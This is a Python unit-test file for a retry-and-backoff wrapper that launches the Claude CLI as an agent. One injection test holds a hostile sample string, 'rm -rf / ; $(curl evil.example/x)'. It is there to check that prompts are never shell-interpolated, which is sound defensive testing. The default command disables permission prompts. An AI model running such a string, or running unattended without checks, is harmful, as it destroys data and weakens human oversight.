"""Unit tests for :mod:`whilly.adapters.runner.claude_cli` (TASK-017b, PRD FR-1.6, TC-7).

What we cover
-------------
- ``build_command`` honours ``CLAUDE_BIN`` and ``WHILLY_CLAUDE_SAFE`` env knobs.
- :func:`run_task` resolves the model in the documented priority order
  (explicit arg → ``WHILLY_MODEL`` env → :data:`DEFAULT_MODEL`).
- Successful runs return immediately without sleeping.
- Retriable errors (non-zero exit, ``API Error: 5xx``, ``"type":"error"``)
  trigger the documented exponential backoff (5/10/20/40/60s) and exhaust
  to the *last* result, not a synthetic message.
- Permanent auth errors (``failed to authenticate``, ``403 Forbidden``)
  return immediately without consuming any retry budget.
- Missing-binary / spawn-rejected paths produce the documented negative
  exit codes (-2, -3) without raising.

How we isolate from real subprocess
-----------------------------------
Tests patch :func:`_spawn_and_collect` (the lowest-level seam) on the
module rather than mocking ``asyncio.create_subprocess_exec`` itself. That
keeps the assertions about retry semantics independent of argv shape, and
keeps argv-shape assertions concentrated in the small ``build_command``
test set. ``backoff_schedule=(0, 0, 0, 0, 0)`` is passed in retry tests so
they take milliseconds, not 135 seconds.
"""

from __future__ import annotations

from collections.abc import Awaitable, Callable, Iterator
from typing import Any

import pytest

from whilly.adapters.runner import (
    BACKOFF_SCHEDULE,
    DEFAULT_BIN,
    DEFAULT_MODEL,
    EXIT_BINARY_NOT_FOUND,
    EXIT_SPAWN_BLOCKED,
    AgentResult,
    AgentUsage,
    build_command,
    run_task,
)
from whilly.adapters.runner import claude_cli
from whilly.core.models import Priority, Task, TaskStatus

# --------------------------------------------------------------------------- #
# Test fixtures + helpers
# --------------------------------------------------------------------------- #


def _make_task(task_id: str = "T-001") -> Task:
    """Build a minimal :class:`Task` for tests that only need ``id`` for logging."""
    return Task(
        id=task_id,
        status=TaskStatus.IN_PROGRESS,
        priority=Priority.MEDIUM,
        description="test task",
    )


@pytest.fixture
def clean_env(monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
    """Clear all env vars the wrapper reads so tests don't leak host config."""
    for key in ("CLAUDE_BIN", "WHILLY_MODEL", "WHILLY_CLAUDE_SAFE"):
        monkeypatch.delenv(key, raising=False)
    yield


def _patch_spawn(
    monkeypatch: pytest.MonkeyPatch,
    results: list[AgentResult],
) -> list[tuple[str, str]]:
    """Replace :func:`_spawn_and_collect` with a script that returns *results* in order.

    Returns a list that the spawn function appends ``(prompt, model)`` to on
    every invocation — tests assert on call count and on the resolved model.
    Raising :class:`StopIteration` on overrun makes "called more times than
    expected" a hard failure rather than a silent reuse of the last result.
    """
    calls: list[tuple[str, str]] = []
    iterator = iter(results)

    async def fake_spawn(prompt: str, model: str) -> AgentResult:
        calls.append((prompt, model))
        try:
            return next(iterator)
        except StopIteration as exc:  # pragma: no cover — defensive: makes overrun loud
            raise AssertionError(
                f"_spawn_and_collect called {len(calls)} times but only {len(results)} canned results were provided"
            ) from exc

    monkeypatch.setattr(claude_cli, "_spawn_and_collect", fake_spawn)
    return calls


def _patch_sleep(monkeypatch: pytest.MonkeyPatch) -> list[float]:
    """Capture every ``await asyncio.sleep(...)`` call in the wrapper.

    Returning a list lets tests assert "we slept exactly these durations
    in this order" — proving both that retries fired AND that they used
    the documented schedule, in one assertion.
    """
    sleeps: list[float] = []

    async def fake_sleep(delay: float) -> None:
        sleeps.append(delay)

    monkeypatch.setattr(claude_cli.asyncio, "sleep", fake_sleep)
    return sleeps


# --------------------------------------------------------------------------- #
# Module-level constants — the schedule is part of the contract
# --------------------------------------------------------------------------- #


def test_backoff_schedule_matches_prd() -> None:
    """The PRD specifies 5/10/20/40/60 — assert the literal so a future
    refactor can't silently change operator-visible cadence."""
    assert BACKOFF_SCHEDULE == (5, 10, 20, 40, 60)


def test_default_bin_is_claude() -> None:
    assert DEFAULT_BIN == "claude"


def test_default_model_is_opus() -> None:
    """The default model must match what v3 used — operators rely on parity."""
    assert DEFAULT_MODEL == "claude-opus-4-6[1m]"


def test_exit_codes_are_in_negative_range() -> None:
    """Negative codes can't collide with POSIX status (0..255 unsigned).

    The result_parser test suite already proves they round-trip; we just
    pin the literal values here so the contract is explicit.
    """
    assert EXIT_BINARY_NOT_FOUND == -2
    assert EXIT_SPAWN_BLOCKED == -3


# --------------------------------------------------------------------------- #
# build_command — argv shape & env knobs
# --------------------------------------------------------------------------- #


def test_build_command_default_uses_claude_bin(clean_env: None) -> None:
    cmd = build_command("hello", "claude-opus-4-6[1m]")
    assert cmd[0] == "claude"
    assert "--dangerously-skip-permissions" in cmd
    assert "--output-format" in cmd
    assert cmd[cmd.index("--output-format") + 1] == "json"
    assert cmd[cmd.index("--model") + 1] == "claude-opus-4-6[1m]"
    assert cmd[-2] == "-p"
    assert cmd[-1] == "hello"


def test_build_command_respects_claude_bin_override(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``CLAUDE_BIN`` env var must redirect to a custom binary path —
    this is the hook tests/CI use to substitute a fake script."""
    monkeypatch.setenv("CLAUDE_BIN", "/opt/fake/claude.sh")
    cmd = build_command("hello", "m")
    assert cmd[0] == "/opt/fake/claude.sh"


def test_build_command_safe_mode_switches_permission_args(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``WHILLY_CLAUDE_SAFE=1`` swaps the unattended permission flag for
    the attended ``acceptEdits`` mode — operational parity with v3."""
    monkeypatch.setenv("WHILLY_CLAUDE_SAFE", "1")
    cmd = build_command("hello", "m")
    assert "--permission-mode" in cmd
    assert cmd[cmd.index("--permission-mode") + 1] == "acceptEdits"
    assert "--dangerously-skip-permissions" not in cmd


def test_build_command_passes_prompt_as_argv_not_shell(clean_env: None) -> None:
    """Prompts may contain shell metacharacters — they must end up as a
    standalone argv entry (``-p`` then the prompt), never interpolated.

    Justification: ``asyncio.create_subprocess_exec`` accepts argv as a list
    so there is no shell to interpret; this test pins the contract for
    future readers who might be tempted to switch to a shell wrapper.
    """
    nasty = "rm -rf / ; $(curl evil.example/x)"
    cmd = build_command(nasty, "m")
    assert cmd[-2] == "-p"
    assert cmd[-1] == nasty  # passed verbatim, no quoting / no interpolation


# --------------------------------------------------------------------------- #
# Model resolution priority
# --------------------------------------------------------------------------- #


async def test_run_task_uses_default_model_when_unset(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls = _patch_spawn(monkeypatch, [AgentResult(output="ok", is_complete=True)])
    _patch_sleep(monkeypatch)
    await run_task(_make_task(), "prompt")
    assert calls == [("prompt", DEFAULT_MODEL)]


async def test_run_task_uses_whilly_model_env_when_set(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("WHILLY_MODEL", "claude-sonnet-4-6")
    calls = _patch_spawn(monkeypatch, [AgentResult(output="ok", is_complete=True)])
    _patch_sleep(monkeypatch)
    await run_task(_make_task(), "prompt")
    assert calls == [("prompt", "claude-sonnet-4-6")]


async def test_run_task_explicit_model_arg_wins_over_env(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("WHILLY_MODEL", "claude-from-env")
    calls = _patch_spawn(monkeypatch, [AgentResult(output="ok", is_complete=True)])
    _patch_sleep(monkeypatch)
    await run_task(_make_task(), "prompt", model="claude-from-arg")
    assert calls == [("prompt", "claude-from-arg")]


# --------------------------------------------------------------------------- #
# Happy path — success returns immediately, no sleep
# --------------------------------------------------------------------------- #


async def test_run_task_success_returns_first_result(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    expected = AgentResult(
        output="All done <promise>COMPLETE</promise>",
        usage=AgentUsage(cost_usd=0.05),
        exit_code=0,
        is_complete=True,
    )
    calls = _patch_spawn(monkeypatch, [expected])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is expected
    assert len(calls) == 1
    assert sleeps == []  # no retries → no sleeps


async def test_run_task_zero_exit_without_completion_marker_is_terminal(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Exit 0 + no ``<promise>COMPLETE</promise>`` is a clean failure —
    the agent gave up gracefully, retry would not help. We surface the
    result immediately so the worker can mark the task FAILED with the
    real explanation rather than spinning through retries.
    """
    expected = AgentResult(output="I cannot complete this task.", exit_code=0, is_complete=False)
    calls = _patch_spawn(monkeypatch, [expected])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is expected
    assert len(calls) == 1
    assert sleeps == []


# --------------------------------------------------------------------------- #
# Retry semantics — exponential backoff on transient errors
# --------------------------------------------------------------------------- #


async def test_run_task_retries_on_nonzero_exit_then_succeeds(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """First call fails (exit 1), second succeeds — wrapper sleeps once
    using the first backoff value, then returns the success."""
    failure = AgentResult(output="boom", exit_code=1)
    success = AgentResult(output="ok <promise>COMPLETE</promise>", is_complete=True)
    calls = _patch_spawn(monkeypatch, [failure, success])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is success
    assert len(calls) == 2
    assert sleeps == [BACKOFF_SCHEDULE[0]]  # one sleep, with the first backoff


async def test_run_task_uses_full_backoff_schedule_when_exhausted(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Six total attempts (1 + 5 retries), and the sleeps must be
    exactly the documented 5/10/20/40/60 sequence."""
    failures = [AgentResult(output="api error: 503", exit_code=1) for _ in range(6)]
    calls = _patch_spawn(monkeypatch, failures)
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    # The last failure is returned verbatim — operator sees the real text.
    assert result is failures[-1]
    assert len(calls) == 6
    assert sleeps == list(BACKOFF_SCHEDULE)


async def test_run_task_detects_api_error_in_output(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Even with exit code 0, an ``API Error: 5xx`` substring is treated
    as retriable — Claude CLI sometimes returns 0 with the error logged
    to stdout when the JSON envelope itself parsed."""
    api_err = AgentResult(output="API Error: 503 Service Unavailable", exit_code=0)
    success = AgentResult(output="ok <promise>COMPLETE</promise>", is_complete=True)
    calls = _patch_spawn(monkeypatch, [api_err, success])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is success
    assert len(calls) == 2
    assert sleeps == [BACKOFF_SCHEDULE[0]]


async def test_run_task_detects_type_error_marker_in_output(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The ``"type":"error"`` JSON envelope substring is retriable."""
    err = AgentResult(output='{"type":"error","message":"transient"}', exit_code=0)
    success = AgentResult(output="ok <promise>COMPLETE</promise>", is_complete=True)
    _patch_spawn(monkeypatch, [err, success])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is success
    assert len(sleeps) == 1


async def test_run_task_custom_backoff_schedule(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The schedule is injectable so callers (and tests) can shorten or
    disable it without monkey-patching internals."""
    failures = [AgentResult(output="boom", exit_code=1) for _ in range(3)]
    success = AgentResult(output="ok <promise>COMPLETE</promise>", is_complete=True)
    _patch_spawn(monkeypatch, [*failures, success])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt", backoff_schedule=(1, 2, 3, 4))

    assert result is success
    assert sleeps == [1, 2, 3]  # only three sleeps because success on the 4th attempt


async def test_run_task_empty_backoff_schedule_disables_retry(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    failure = AgentResult(output="boom", exit_code=1)
    calls = _patch_spawn(monkeypatch, [failure])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt", backoff_schedule=())

    assert result is failure
    assert len(calls) == 1
    assert sleeps == []


# --------------------------------------------------------------------------- #
# Permanent failures — no retry budget burned
# --------------------------------------------------------------------------- #


async def test_run_task_does_not_retry_auth_error(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``failed to authenticate`` must short-circuit — no second call,
    no sleep. Retrying an auth failure wastes time and could trigger
    rate-limiting on the upstream API."""
    auth_err = AgentResult(output="failed to authenticate (401)", exit_code=1)
    calls = _patch_spawn(monkeypatch, [auth_err])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is auth_err
    assert len(calls) == 1
    assert sleeps == []


async def test_run_task_does_not_retry_403_forbidden(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    forbidden = AgentResult(output="HTTP 403 Forbidden — region not allowed", exit_code=1)
    calls = _patch_spawn(monkeypatch, [forbidden])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is forbidden
    assert len(calls) == 1
    assert sleeps == []


async def test_run_task_completion_overrides_retry(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """If the agent emitted ``<promise>COMPLETE</promise>``, the work is
    done — the wrapper must not retry even on non-zero exit."""
    weird = AgentResult(
        output="finished but shell wrapper noisy <promise>COMPLETE</promise>",
        exit_code=2,
        is_complete=True,
    )
    calls = _patch_spawn(monkeypatch, [weird])
    sleeps = _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result is weird
    assert len(calls) == 1
    assert sleeps == []


# --------------------------------------------------------------------------- #
# Subprocess-level failures — negative exit codes, no exceptions
# --------------------------------------------------------------------------- #


async def test_spawn_and_collect_handles_missing_binary(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When the binary cannot be found, we surface ``EXIT_BINARY_NOT_FOUND``
    with a human-readable message — never raise FileNotFoundError up."""

    async def boom(*args: Any, **kwargs: Any) -> Any:
        raise FileNotFoundError("claude")

    monkeypatch.setattr(claude_cli.asyncio, "create_subprocess_exec", boom)

    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert result.exit_code == EXIT_BINARY_NOT_FOUND
    assert "not found" in result.output.lower()


async def test_spawn_and_collect_handles_blocking_io(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    async def boom(*args: Any, **kwargs: Any) -> Any:
        raise BlockingIOError(35, "Resource temporarily unavailable")

    monkeypatch.setattr(claude_cli.asyncio, "create_subprocess_exec", boom)

    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert result.exit_code == EXIT_SPAWN_BLOCKED
    assert "blocked" in result.output.lower()


async def test_run_task_retries_on_missing_binary(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A missing-binary result has a negative (non-zero) exit code, which
    is retriable. After exhaustion the negative code is preserved so the
    caller can distinguish 'binary missing' from a normal API error."""
    missing = AgentResult(output="claude not found", exit_code=EXIT_BINARY_NOT_FOUND)
    _patch_spawn(monkeypatch, [missing] * 6)
    _patch_sleep(monkeypatch)

    result = await run_task(_make_task(), "prompt")

    assert result.exit_code == EXIT_BINARY_NOT_FOUND


# --------------------------------------------------------------------------- #
# stdout/stderr handling in _spawn_and_collect
# --------------------------------------------------------------------------- #


class _FakeProc:
    """Minimal stand-in for ``asyncio.subprocess.Process`` used in I/O tests."""

    def __init__(self, stdout: bytes, stderr: bytes, returncode: int) -> None:
        self._stdout = stdout
        self._stderr = stderr
        self.returncode = returncode

    async def communicate(self) -> tuple[bytes, bytes]:
        return self._stdout, self._stderr


def _patch_subprocess(
    monkeypatch: pytest.MonkeyPatch,
    proc: _FakeProc,
) -> Callable[..., Awaitable[_FakeProc]]:
    async def fake_create(*args: Any, **kwargs: Any) -> _FakeProc:
        return proc

    monkeypatch.setattr(claude_cli.asyncio, "create_subprocess_exec", fake_create)
    return fake_create


async def test_spawn_and_collect_parses_real_stdout(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """End-to-end through ``parse_output``: stdout JSON envelope → AgentResult."""
    envelope = (
        b'{"result": "ok <promise>COMPLETE</promise>", "total_cost_usd": 0.01, '
        b'"usage": {"input_tokens": 10, "output_tokens": 5}}'
    )
    _patch_subprocess(monkeypatch, _FakeProc(envelope, b"", 0))

    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert result.exit_code == 0
    assert result.is_complete is True
    assert result.usage.cost_usd == pytest.approx(0.01)
    assert result.usage.input_tokens == 10


async def test_spawn_and_collect_falls_back_to_stderr_when_stdout_empty(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """If the JSON envelope never appears on stdout, stderr is surfaced
    so operators have *something* to debug with."""
    _patch_subprocess(monkeypatch, _FakeProc(b"", b"FATAL: claude refused to start", 2))

    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert result.exit_code == 2
    assert "FATAL: claude refused to start" in result.output


async def test_spawn_and_collect_decodes_invalid_utf8_with_replacement(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Invalid UTF-8 bytes must NOT crash the wrapper — Claude CLI is
    UTF-8 but agents have been observed to interleave invalid bytes from
    embedded shell tools. ``errors='replace'`` keeps us alive."""
    bad = b'{"result": "broken \xff\xfe end"}'
    _patch_subprocess(monkeypatch, _FakeProc(bad, b"", 0))

    # Must not raise UnicodeDecodeError.
    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert "broken" in result.output


async def test_spawn_and_collect_treats_none_returncode_as_zero(
    clean_env: None,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """If the subprocess somehow exits without a recorded returncode (rare
    edge case in asyncio when communicate() returns before SIGCHLD is
    fully propagated), we coerce to 0 rather than crashing on
    ``parse_output(stdout, exit_code=None)``."""
    _patch_subprocess(monkeypatch, _FakeProc(b'{"result": "ok"}', b"", returncode=None))  # type: ignore[arg-type]

    result = await claude_cli._spawn_and_collect("prompt", "m")

    assert result.exit_code == 0
